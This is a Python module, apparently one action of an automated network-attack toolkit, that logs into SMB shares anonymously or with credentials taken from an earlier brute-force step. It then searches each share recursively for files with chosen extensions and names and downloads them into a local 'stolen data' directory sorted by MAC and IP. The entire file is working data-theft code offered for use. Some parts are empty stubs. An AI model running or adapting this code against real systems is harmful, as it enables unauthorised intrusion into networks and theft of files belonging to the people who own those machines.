"""
steal_files_smb.py - This script connects to SMB shares using provided credentials or anonymous access, searches for specific files, and downloads them to a local directory.
"""

import os
import logging
from threading import Timer
import time
from smb.SMBConnection import SMBConnection
from smb.base import SharedFile
from shared import SharedData
from logger import Logger
from actions.base_steal import BaseSteal

logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)

b_class = "StealFilesSMB"
b_module = "steal_files_smb"
b_status = "steal_files_smb"
b_parent = "SMBBruteforce"
b_port = 445

IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$', 'Sharename', '---------', 'SMB1'}


class StealFilesSMB(BaseSteal):
    protocol_name = "smb"
    credential_file_attr = "smbfile"

    def connect(self, ip, username, password):
        try:
            conn = SMBConnection(username, password, "your-pax", "Target", use_ntlm_v2=True, is_direct_tcp=True)
            conn.connect(ip, 445)
            logger.info(f"Connected to {ip} via SMB with username {username}")
            self.connected = True
            return conn
        except Exception as e:
            logger.error(f"SMB connection error for {ip} with user '{username}' and password '{password}': {e}")
            return None

    def find_items(self, conn, dir_path):
        pass

    def steal_item(self, conn, remote_item, local_dir):
        pass

    def list_shares(self, conn):
        try:
            shares = conn.listShares()
            valid_shares = [share for share in shares if share.name not in IGNORED_SHARES and not share.isSpecial and not share.isTemporary]
            logger.info(f"Found valid shares: {[share.name for share in valid_shares]}")
            return valid_shares
        except Exception as e:
            logger.error(f"Error listing shares: {e}")
            return []

    def find_files(self, conn, share_name, dir_path):
        files = []
        try:
            for file in conn.listPath(share_name, dir_path):
                if file.isDirectory:
                    if file.filename not in ['.', '..']:
                        files.extend(self.find_files(conn, share_name, os.path.join(dir_path, file.filename)))
                else:
                    if any(file.filename.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(file_name in file.filename for file_name in self.shared_data.steal_file_names):
                        files.append(os.path.join(dir_path, file.filename))
            logger.info(f"Found {len(files)} matching files in {dir_path} on share {share_name}")
        except Exception as e:
            logger.error(f"Error accessing path {dir_path} in share {share_name}: {e}")
        return files

    def steal_file(self, conn, share_name, remote_file, local_dir):
        try:
            rel_path = os.path.relpath(remote_file, '/')
            if rel_path.startswith('..') or os.path.isabs(rel_path):
                raise ValueError("Path traversal detected")
            local_file_path = os.path.join(local_dir, rel_path)
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                conn.retrieveFile(share_name, remote_file, f)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from share {share_name}: {e}")

    def execute(self, ip, port, row, status_key):
        try:
            if self.b_parent_action:
                if 'success' not in row.get(self.b_parent_action, ''):
                    return 'skipped'

            self.shared_data.orch_status = "StealFilesSMB"
            logger.info(f"Stealing files from {ip}:{port}...")
            time.sleep(5)

            smbfile = self.shared_data.smbfile
            credentials = {}
            if os.path.exists(smbfile):
                with open(smbfile, 'r') as f:
                    lines = f.readlines()[1:]
                    for line in lines:
                        parts = line.strip().split(',')
                        if parts[1] == ip:
                            share = parts[3]
                            user = parts[4]
                            password = parts[5]
                            if share not in credentials:
                                credentials[share] = []
                            credentials[share].append((user, password))
                logger.info(f"Found credentials for {len(credentials)} shares on {ip}")

            def try_anonymous_access():
                try:
                    conn = self.connect(ip, '', '')
                    shares = self.list_shares(conn)
                    return conn, shares
                except Exception as e:
                    logger.info(f"Anonymous access to {ip} failed: {e}")
                    return None, None

            if not credentials and not try_anonymous_access():
                logger.error(f"No valid credentials found for {ip}. Skipping...")
                return 'failed'

            def timeout():
                if not self.connected:
                    logger.error(f"No SMB connection established within 4 minutes for {ip}. Marking as failed.")
                    self.stop_execution = True

            timer = Timer(240, timeout)
            timer.start()

            success = False
            conn, shares = try_anonymous_access()
            if conn and shares:
                for share in shares:
                    if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                        continue
                    remote_files = self.find_files(conn, share.name, '/')
                    mac = row['MAC Address']
                    local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share.name}")
                    if remote_files:
                        for remote_file in remote_files:
                            if self.stop_execution:
                                break
                            self.steal_file(conn, share.name, remote_file, local_dir)
                        success = True
                        countfiles = len(remote_files)
                        logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
                conn.close()
                if success:
                    timer.cancel()

            attempted_shares = {share.name for share in shares} if success else set()

            for share, creds in credentials.items():
                if share in attempted_shares or share in IGNORED_SHARES:
                    continue
                for username, password in creds:
                    if self.stop_execution:
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for share {share} on {ip}")
                        conn = self.connect(ip, username, password)
                        if conn:
                            remote_files = self.find_files(conn, share, '/')
                            mac = row['MAC Address']
                            local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share}")
                            if remote_files:
                                for remote_file in remote_files:
                                    if self.stop_execution:
                                        break
                                    self.steal_file(conn, share, remote_file, local_dir)
                                success = True
                                countfiles = len(remote_files)
                                logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} on share '{share}' with user '{username}'")
                            conn.close()
                            if success:
                                timer.cancel()
                                break
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} on share '{share}' with user '{username}': {e}")

            if not success:
                logger.error(f"Failed to steal any files from {ip}:{port}")
                return 'failed'
            else:
                return 'success'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_smb = StealFilesSMB(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
